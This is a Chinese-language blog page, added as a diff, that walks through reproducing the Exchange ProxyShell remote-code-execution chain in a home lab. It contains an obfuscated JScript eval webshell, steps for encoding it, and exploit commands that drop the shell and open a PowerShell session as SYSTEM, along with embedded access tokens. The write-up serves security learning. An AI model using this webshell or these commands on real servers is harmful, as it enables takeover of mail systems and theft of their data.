@@ -1,0 +1,507 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.25.0" theme-name="Stellar" theme-version="1.25.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>漏洞复现：Exchange ProxyShell - Misc010</title>
+
+  
+    <meta name="description" content="漏洞信息    名称&#x2F;编号 影响范围 已复现版本 测不通的版本     ProxyShell Exchange Server 2010Exchange Server 2013Exchange Server 2016Exchange Server 2019 Exchange 2016 cu18Exchange 2019 cu9(?)     3个CVE组合成的RCE：  CVE-2021-3447">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Exchange ProxyShell">
+<meta property="og:url" content="https://misc0101.github.io/wiki/vuln_reproduction/Exchange_ProxyShell.html">
+<meta property="og:site_name" content="Misc010">
+<meta property="og:description" content="漏洞信息    名称&#x2F;编号 影响范围 已复现版本 测不通的版本     ProxyShell Exchange Server 2010Exchange Server 2013Exchange Server 2016Exchange Server 2019 Exchange 2016 cu18Exchange 2019 cu9(?)     3个CVE组合成的RCE：  CVE-2021-3447">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311142228102.png">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311135845400.png">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311141831325.png">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311142623882.png">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311142740732.png">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311142908600.png">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311143203603.png">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311143706790.png">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311160242369.png">
+<meta property="og:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311170519182.png">
+<meta property="article:published_time" content="2024-03-11T05:29:39.000Z">
+<meta property="article:modified_time" content="2024-03-11T05:29:39.000Z">
+<meta property="article:author" content="Misc">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://misc0101.github.io/Typora_images/Exchange_ProxyShell/image-20240311142228102.png">
+  
+  
+  
+  
+
+  <!-- feed -->
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+
+  
+
+  
+  
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='wiki'>
+    
+
+  
+
+
+
+
+<div class="widgets"><widget class="widget-wrapper logo-wrap wiki"><div class="widget-body"><a style="filter: grayscale(100%)" class="wiki-home cap" href="/wiki"><svg aria-hidden="true" viewBox="0 0 16 16" width="1.2em" height="1.2em" fill="currentColor"><path fill-rule="evenodd" d="M7.78 12.53a.75.75 0 01-1.06 0L2.47 8.28a.75.75 0 010-1.06l4.25-4.25a.75.75 0 011.06 1.06L4.81 7h7.44a.75.75 0 010 1.5H4.81l2.97 2.97a.75.75 0 010 1.06z"></path></svg>所有项目</a><a class="title" href="/wiki/vuln_reproduction/%E7%9B%AE%E5%BD%95_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html"><div class="main" ff="title">漏洞复现</div></a></div></widget>
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search-wrapper"><form class="search-form"><input type="text" class="search-input" id="search-input" data-filter="/wiki/vuln_reproduction/" placeholder="在/wiki/vuln_reproduction/中搜索..."><svg t="1705074644177" class="icon search-icon" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc multi" id="data-toc" collapse="false"><div class="widget-header cap dis-select"><span class="name">索引</span></div><div class="widget-body fs14"><div class="doc-tree"><a class="doc-tree-link" href="/wiki/vuln_reproduction/%E7%9B%AE%E5%BD%95_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html#start"><span class="toc-text">目录</span></a></div><div class="doc-tree"><a class="doc-tree-link" href="/wiki/vuln_reproduction/%E6%96%87%E7%AB%A0%E6%A8%A1%E6%9D%BF_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html"><span class="toc-text">文章模板</span></a></div></div><div class="widget-header cap dis-select"><span class="name">RCE</span></div><div class="widget-body fs14"><div class="doc-tree"><a class="doc-tree-link" href="/wiki/vuln_reproduction/PrintNightmare.html"><span class="toc-text">PrintNightmare CVE-2021-1675/CVE-2021-34527</span></a></div><div class="doc-tree"><a class="doc-tree-link" href="/wiki/vuln_reproduction/Exchange_CVE-2021-26858_CVE-2021-27065.html"><span class="toc-text">Exchange CVE-2021-26858/CVE-2021-27065</span></a></div><div class="doc-tree active"><a class="doc-tree-link active" href="/wiki/vuln_reproduction/Exchange_ProxyShell.html"><span class="toc-text">Exchange ProxyShell</span></a><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%A1%E6%81%AF"><span class="toc-text"> 漏洞信息</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text"> 漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%8B%93%E6%89%91"><span class="toc-text"> 环境拓扑</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E7%8E%AF%E5%A2%83%E8%A6%81%E6%B1%82"><span class="toc-text"> 靶机环境要求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#webshell%E5%87%86%E5%A4%87"><span class="toc-text"> webshell准备</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text"> 漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#troubleshooting"><span class="toc-text"> troubleshooting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exchange2019%E5%A4%8D%E7%8E%B0%E9%97%AE%E9%A2%98"><span class="toc-text"> Exchange2019复现问题</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%AD%A5%E9%AA%A4%E5%AD%A6%E4%B9%A0"><span class="toc-text"> 利用步骤学习</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5"><span class="toc-text"> 参考链接</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E7%89%88%E7%9A%84proxyshell"><span class="toc-text"> 其他版的ProxyShell</span></a></li></ol></li></ol></div><div class="doc-tree"><a class="doc-tree-link" href="/wiki/vuln_reproduction/Samba_CVE-2017-7494.html"><span class="toc-text">Samba CVE-2017-7494</span></a></div></div></widget>
+
+<widget class="widget-wrapper related"><div class="widget-header cap theme dis-select"><span class="name">更多：安全技术</span></div><div class="widget-body related-posts"><a class="item wiki" href="/wiki/C++_disassembly/%E5%88%86%E6%94%AF%E8%AF%AD%E5%8F%A5_C++_disassembly.html"><span class="title">C++反汇编</span><span class="excerpt">C++反汇编，总结版（To finish...）。</span></a><a class="item wiki" href="/wiki/Hook/%E7%9B%AE%E5%BD%95.html"><span class="title">Hook专题</span><span class="excerpt">Hook技术专题。</span></a><a class="item wiki" href="/wiki/Injection/%E5%AF%BC%E5%85%A5%E8%A1%A8%E6%B3%A8%E5%85%A5.html"><span class="title">注入技术专题</span><span class="excerpt">注入的本质是将自己的数据放到目标进程空间中执行，没有一种注入技术是通杀无敌的。学习各种注入技术，在学习操作方法以外，还要深入了解其背后原理。万一哪天自己融会贯通发明了一种全新的注入技术呢？</span></a><a class="item wiki" href="/wiki/PE/Overview_PE.html"><span class="title">PE</span><span class="excerpt">滴水三期_PE文件笔记(To finish...)。</span></a><a class="item wiki" href="/wiki/Protected_Mode/%E6%AE%B5%E5%AF%84%E5%AD%98%E5%99%A8.html"><span class="title">Protected_Mode</span><span class="excerpt">滴水三期_保护模式笔记。</span></a><a class="item wiki" href="/wiki/cryptography/DES.html"><span class="title">密码学</span><span class="excerpt">一些加密算法原理和流程细节，目前包含：对称加密DES、AES、SM4、ZUC；非对称RSA和ElGamal。</span></a></div></widget>
+</div>
+
+
+    </aside>
+    <div class='l_main'>
+      
+  
+
+
+
+
+
+      
+
+
+<div class="bread-nav fs12"><div class="left"><div id="breadcrumb"><a class="cap breadcrumb" id="home" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" id="menu" href="/wiki/">项目</a><span class="sep"></span><a class="cap breadcrumb" id="proj" href="/wiki/vuln_reproduction/%E7%9B%AE%E5%BD%95_%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0.html">漏洞复现</a></div><div id="post-meta">
+    <span>更新于&nbsp;<time datetime="2024-03-11T05:29:39.000Z">2024-03-11</time></span>
+    </div></div></div>
+
+<article class='md-text content wiki'>
+<h1 class="article-title"><span>Exchange ProxyShell</span></h1>
+<h2 id="漏洞信息"><a class="markdownIt-Anchor" href="#漏洞信息"></a> 漏洞信息</h2>
+<table>
+<thead>
+<tr>
+<th>名称/编号</th>
+<th>影响范围</th>
+<th>已复现版本</th>
+<th>测不通的版本</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>ProxyShell</td>
+<td>Exchange Server 2010</br>Exchange Server 2013</br>Exchange Server 2016</br>Exchange Server 2019</td>
+<td>Exchange 2016 cu18</br>Exchange 2019 cu9(?)</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>3个CVE组合成的RCE：</p>
+<ul>
+<li>CVE-2021-34473 Microsoft Exchange ACL绕过漏洞</li>
+<li>CVE-2021-34523 Microsoft Exchange权限提升漏洞</li>
+<li>CVE-2021-31207 Microsoft Exchange授权任意文件写入漏洞</li>
+</ul>
+<h2 id="漏洞复现"><a class="markdownIt-Anchor" href="#漏洞复现"></a> 漏洞复现</h2>
+<h3 id="环境拓扑"><a class="markdownIt-Anchor" href="#环境拓扑"></a> 环境拓扑</h3>
+<table>
+<thead>
+<tr>
+<th>虚拟机</th>
+<th>ip</th>
+<th>所在域</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Exchange2016cu18</td>
+<td>192.168.147.141</td>
+<td>exchange.local</td>
+</tr>
+</tbody>
+</table>
+<p>这个靶机环境是使用server2016搭建DC，然后在该DC上安装Exchange2016，所在域是exchange.local</p>
+<table>
+<thead>
+<tr>
+<th>虚拟机</th>
+<th>ip</th>
+<th>所在域</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Exchange 2019 cu9</td>
+<td>192.168.147.151</td>
+<td>exchange2019.local</td>
+</tr>
+</tbody>
+</table>
+<p>这个靶机环境是使用server2019搭建DC，然后在该DC上安装Exchange2019，所在域是exchange2019.local</p>
+<hr />
+<p>装有python3的攻击机一台</p>
+<h3 id="靶机环境要求"><a class="markdownIt-Anchor" href="#靶机环境要求"></a> 靶机环境要求</h3>
+<p>exp执行时参数的用户要是Mailbox Import Export角色，可以通过Exchange管理中心（EAC）或通过Exchange管理Shell来添加：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ManagementRoleAssignment -Role &quot;Mailbox Import Export&quot; -User &quot;your user&quot;</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><figcaption><span>例</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-ManagementRoleAssignment –Role &quot;Mailbox Import Export&quot; –User &quot;Administrator&quot;</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://github.com/dmaasland/proxyshell-poc/issues/4">github_proxyshell-poc_issue#4</a></p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311142228102.png" alt="image-20240311142228102" /></p>
+<h3 id="webshell准备"><a class="markdownIt-Anchor" href="#webshell准备"></a> webshell准备</h3>
+<ol>
+<li>
+<p>使用<code>proxyshell_payload</code>对webshell进行Encode</p>
+<figure class="highlight shell"><figcaption><span>假设想使用这段webshell</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var NNVF=\&#x27;dFUwlmztVCSLYeHkDMgEZrKWhjQBNsuiGnf0xJPqAcvbIopXyaTR\&#x27;;var NURV=Request.Form(&quot;mima&quot;);var FASZ=NNVF(2) + NNVF(28) + NNVF(10) + NNVF(40) + NNVF(1) + NNVF(13);eval(NURV, FASZ);%&gt;&#x27;</span><br></pre></td></tr></table></figure>
+<p>将上面这段webshell赋值给<code>proxyshell_payload.py</code>中main函数的webshell变量之间，替换后如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#源码其他部分略</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    webshell = <span class="string">b&#x27;&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var NNVF=\&#x27;dFUwlmztVCSLYeHkDMgEZrKWhjQBNsuiGnf0xJPqAcvbIopXyaTR\&#x27;;var NURV=Request.Form(&quot;mima&quot;);var FASZ=NNVF(2) + NNVF(28) + NNVF(10) + NNVF(40) + NNVF(1) + NNVF(13);eval(NURV, FASZ);%&gt;&#x27;</span></span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line"><span class="comment">#源码其他部分略</span></span><br></pre></td></tr></table></figure>
+<p>执行脚本进行Encode</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxyshell_payload.py</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311135845400.png" alt="image-20240311135845400" /></p>
+</li>
+<li>
+<p>将Encode webshell部分的内容复制，放到<code>proxyshell_rce.py</code>314行的<code>&lt;t:Content&gt;</code>元素之间</p>
+</li>
+<li>
+<p>可以根据自己的需求修改生成shell的路径，修改<code>Proxyshell_rce.py</code>中这两行内容，将其对应<br />
+<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311141831325.png" alt="image-20240311141831325" /></p>
+</li>
+</ol>
+<div class="tag-plugin colorful folders" ><details class="folder" index="0"><summary><span>对webshell编码的原因</span></summary><div class="body"><blockquote><p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-qJh2u0mbrKWxWNCZgOrVw">ProxyShell的复现与分析</a></p></blockquote><p><strong>Webshell-Attack Exchange PowerShell</strong></p><p>最后一部分就是在获取了exchange的管理powershell接口之后，如何获取webshell：</p><p>这里使用的是邮件导出请求New-MailboxExportRequest：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-MailboxExportRequest –Mailbox orange@orange.local –FilePath</span><br><span class="line">\\127.0.0.1\C$\path\to\shell.aspx</span><br></pre></td></tr></table></figure><p>但是默认导出的格式是pst，并且pst格式会对内容进行加密，直接在邮件中写入webshell并不会生效。</p><p>orange于是对pst格式进行了研究，去阅读了 MS-PST的文档，发现其使用的加密为类似异或加密模式，也就是说加密在加密就变成了明文，那么只要先使用其加密方法加密一遍我们要写入的webshell，就可以在导出时，获得明文，从而获取webshell。</p><hr /><p>所以要用proxyshell_payload.py先对webshell进行编码然后放到exp的附件中</p></div></details></div>
+<h3 id="漏洞利用"><a class="markdownIt-Anchor" href="#漏洞利用"></a> 漏洞利用</h3>
+<figure class="highlight shell"><figcaption><span>exp语法格式</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxyshell_rce.py -u https://x.x.x.x/ -e administrator@xxx.com（最后这个邮箱必须为目标邮箱管理组的邮箱用户名，一般administrator都在）</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><figcaption><span>Exchange2016漏洞利用</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxyshell_rce.py -u https://192.168.147.141/ -e administrator@exchange.local</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311142623882.png" alt="image-20240311142623882" /></p>
+<p>执行exp后，获取到的是exchange的powershell管理shell，然后清理邮件导出请求，之后执行dropshell，即可写入webshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-MailboxExportRequest</span><br><span class="line">Get-MailboxExportRequest|Remove-MailboxExportRequest -Confirm:$false</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311142740732.png" alt="image-20240311142740732" /></p>
+<p><code>dropshell</code>写webshell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dropshell</span><br></pre></td></tr></table></figure>
+<p>在<code>C:\inetpub\wwwroot\aspnet_client</code>下看到写的webshell</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311142908600.png" alt="image-20240311142908600" /></p>
+<p>成功后使用蚁剑连接webshell，连接地址为终端回显的webshell-url地址，密码为mima，勾选忽略HTTPS证书</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311143203603.png" alt="image-20240311143203603" /></p>
+<p>连接成功，终端回显权限为system</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311143706790.png" alt="image-20240311143706790" /></p>
+<h3 id="troubleshooting"><a class="markdownIt-Anchor" href="#troubleshooting"></a> troubleshooting</h3>
+<ol>
+<li>靶机注意关闭杀软，要不写shell可能被杀</li>
+</ol>
+<h3 id="exchange2019复现问题"><a class="markdownIt-Anchor" href="#exchange2019复现问题"></a> Exchange2019复现问题</h3>
+<figure class="highlight shell"><figcaption><span>Exchange2019漏洞利用</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python proxyshell_rce.py -u https://192.168.147.151/ -e Administrator@exchange2019.local</span><br></pre></td></tr></table></figure>
+<p>到dropshell步骤前都正常</p>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/../Typora_images/Exchange_ProxyShell/image-20240311160242369.png" alt="image-20240311160242369" /></p>
+<p>然后执行dropshell有概率failed，不清楚原因。但如果先用这版的<a target="_blank" rel="noopener" href="https://github.com/horizon3ai/proxyshell">proxyshell</a>工具先dropshell（能写入webshell，俺将上边webshell的Encode放入t.Conent之间，写webshell，但是蚁剑连接提示数据为空），后面用<code>proxyshell_rce.py</code>就百分百能写webshell。</p>
+<figure class="highlight shell"><figcaption><span>依赖</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tldextract</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python exchange_proxyshell_raw.py -u https://192.168.147.151</span><br><span class="line"></span><br><span class="line">dropshell</span><br></pre></td></tr></table></figure>
+<h3 id="利用步骤学习"><a class="markdownIt-Anchor" href="#利用步骤学习"></a> 利用步骤学习</h3>
+<p>参考这篇文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43820662/article/details/120669214">Exchange ProxyShell复现_exchange shell-CSDN博客</a>，远程写webshell是通过发邮件，webshell在附件中，然后解压到本地。</p>
+<h2 id="参考链接"><a class="markdownIt-Anchor" href="#参考链接"></a> 参考链接</h2>
+<table>
+<thead>
+<tr>
+<th>参考链接🔗</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://saucer-man.com/information_security/776.html">Exchange CVE-2021-34473 RCE复现</a></td>
+<td>复现参考文章之一</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/-qJh2u0mbrKWxWNCZgOrVw">ProxyShell的复现与分析</a></td>
+<td>复现参考文章之一</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://www.cnblogs.com/colin-B/p/15783751.html">Exchange CVE-2021-34473</a></td>
+<td>复现参考文章之一，很详细，webshell现成可用</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/Ridter/proxyshell_payload">proxyshell_payload</a></td>
+<td>对webshell  Encode成ProxyShell的payload</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/dmaasland/proxyshell-poc">proxyshell-poc</a></td>
+<td>exp利用</td>
+</tr>
+</tbody>
+</table>
+<h3 id="其他版的proxyshell"><a class="markdownIt-Anchor" href="#其他版的proxyshell"></a> 其他版的ProxyShell</h3>
+<table>
+<thead>
+<tr>
+<th>参考链接🔗</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://github.com/je6k/CVE-2021-34473-Exchange-ProxyShell">CVE-2021-34473-Exchange-ProxyShell</a></td>
+<td>步骤拆分版</td>
+</tr>
+</tbody>
+</table>
+<p>步骤拆分版：</p>
+<ul>
+<li>token</li>
+<li>发邮件</li>
+<li>getshell</li>
+</ul>
+<p>2019试了getshell不行</p>
+<figure class="highlight shell"><figcaption><span>命令记录</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">2016：</span><br><span class="line"> 单个获取token</span><br><span class="line">python send_webshell_mail.py https://192.168.147.141 administrator@exchange.local</span><br><span class="line"> (只发送webshell 草稿邮件)</span><br><span class="line">python send_webshell_mail.py https://192.168.147.141 administrator@exchange.local send</span><br><span class="line"></span><br><span class="line">python wsman_shell.py https://192.168.147.141 administrator@exchange.local VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTBxhZG1pbmlzdHJhdG9yQGV4Y2hhbmdlLmxvY2FsVS1TLTEtNS0yMS0yODA0NDc5NzgxLTM3MzM1MzQ0MDktMjQ0NjY5OTQwNC01MDBHAQAAAAcAAAAMUy0xLTUtMzItNTQ0RQAAAAA= shell</span><br><span class="line"></span><br><span class="line">2019：</span><br><span class="line"> 单个获取token</span><br><span class="line">python send_webshell_mail.py https://192.168.147.151 Administrator@exchange2019.local</span><br><span class="line"> (只发送webshell 草稿邮件)</span><br><span class="line">python send_webshell_mail.py https://192.168.147.151 Administrator@exchange2019.local send</span><br><span class="line"></span><br><span class="line">python wsman_shell.py https://192.168.147.141 administrator@exchange.local VgEAVAdXaW5kb3dzQwBBCEtlcmJlcm9zTCBBZG1pbmlzdHJhdG9yQGV4Y2hhbmdlMjAxOS5sb2NhbFUrUy0xLTUtMjEtNzkzNTEwODE1LTcxOTY4NTQxMC0zNDU1NTgzNjg3LTUwMEcBAAAABwAAAAxTLTEtNS0zMi01NDRFAAAAAA== shell</span><br></pre></td></tr></table></figure>
+<hr />
+<table>
+<thead>
+<tr>
+<th>参考链接🔗</th>
+<th>备注</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><a target="_blank" rel="noopener" href="https://github.com/ktecv2000/ProxyShell">ProxyShell</a></strong></td>
+<td>一键利用版</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://codeantenna.com/a/JMadcrhX0j">https://codeantenna.com/a/JMadcrhX0j</a></td>
+<td>参考文章</td>
+</tr>
+<tr>
+<td><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_43820662/article/details/120669214">Exchange ProxyShell复现_exchange shell-CSDN博客</a></td>
+<td>参考文章</td>
+</tr>
+<tr>
